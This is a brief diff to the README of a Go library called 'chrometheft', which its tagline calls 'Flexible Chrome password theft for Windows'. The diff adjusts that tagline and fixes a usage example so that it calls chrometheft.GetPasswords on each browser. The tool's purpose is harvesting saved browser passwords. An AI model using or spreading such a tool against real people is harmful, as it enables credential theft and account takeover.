@@ -1,5 +1,5 @@
 # chrometheft
-Flexible Chrome password theft
+Flexible Chrome password theft for Windows
 
 # Usage
 ## Quick start
@@ -21,7 +21,7 @@ func main() {
 	}
 	for _, browser := range browsers {
 		fmt.Println("Browser:", browser)
-		passwords, err := browser.GetPasswords(browser)
+		passwords, err := chrometheft.GetPasswords(browser)
 		if err != nil {
 			fmt.Println("Error:", err)
 		}
